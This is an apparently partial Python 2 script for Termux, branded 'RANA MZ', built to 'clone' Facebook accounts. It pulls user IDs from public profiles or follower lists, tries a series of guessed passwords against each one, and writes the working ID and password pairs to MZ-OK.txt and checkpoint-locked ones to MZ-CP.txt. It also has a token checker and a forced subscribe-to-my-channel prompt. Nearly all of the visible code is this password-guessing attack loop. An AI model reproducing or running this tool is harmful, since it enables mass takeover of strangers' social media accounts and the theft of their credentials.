...
if not os.path.isfile('/data/data/com.termux/files/home/RANA MZ/...../node_modules/bytes/index.js'):
    ...
    os.system('clear')
    print '\x1b[1;35m1st Subcribe My Channal Then Cantioue\x1b[0;97m'
    ...
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\x1b[1;36m1st Subcribe My Channal Then Cantioue\x1b[0;97m'
    os.system('xdg-open https://youtube.com/channel/UCd98cgcWQyHYWcnDAS9CedA')
    time.sleep(10)
...
def logo():
    os.system('echo -e "\n\nCODER + AUTHOR iZ  : Rana MZ  \nHAHA    : NAM TU SUNA HUGA \nFB + YT     : RANA MZ \nAuthor2       : INTEQ AL \nHAHA SUN  : DONT TRy To  COPY ME BecZ IM THE ONE\n -------\n " | lolcat')
def method_menu():
    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;35m ENJOY FAST CLONING \x1b[0;97m'
    print ''
...
def b_menu():
    ...
    try:
        ...
        logo()
        print ''
        print '\t    \x1b[1;31mWorking Hai Data or wifi pr \x1b[0;97m'
        print ''
        time.sleep(1)
    ...
    print ''
    print '\t  \x1b[1;33m[1] CLoning  from public id \x1b[0;97m'
    print '\t  \x1b[1;35m[2] CLoning  from followers \x1b[0;97m'
    print '\t  \x1b[1;34m[3] CHek token \x1b[0;97m'
    print '\t  \x1b[1;36m[4] Find date of birth \x1b[0;97m'
    print '\t  \x1b[1;31m[5] Back \x1b[0;97m'
    print '\t  \x1b[1;32m[6] Dafa Kar \x1b[0;97m'
    print ''
    b_menu_select()
...
def b_menu_select():
    ...
    time.sleep(0.5)
    print ' CLoning Iz Strat please Wait'
    print ''
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'www.facebook.com' in d['error_msg']:
                print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass1
                cp = open('MZ-CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;92m[RANA MZ - SUCCESSFUL] \x1b[1;30m' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('MZ-OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
                ...
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass2
                    cp = open('MZ-CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;92m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('MZ-OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                    ...
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass3
                        cp = open('MZ-CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;92m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('MZ-OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                        ...
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass4
                            cp = open('MZ-CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;92m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('MZ-OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                            ...
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass5
                                cp = open('MZ-CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;92m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('MZ-OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                                ...
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass6
                                    cp = open('MZ-CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('MZ-OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[MZ_CP OPEN AFTER 8 DAYS] ' + uid + ' | ' + pass7
                                        cp = open('MZ-CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('MZ-OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
...
def l_menu_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('MZ-OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('MZ-OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('MZ-OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('MZ-OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('MZ-OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('MZ-OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;32m[RANA MZ - Successful] \x1b[1;30m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('MZ-OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
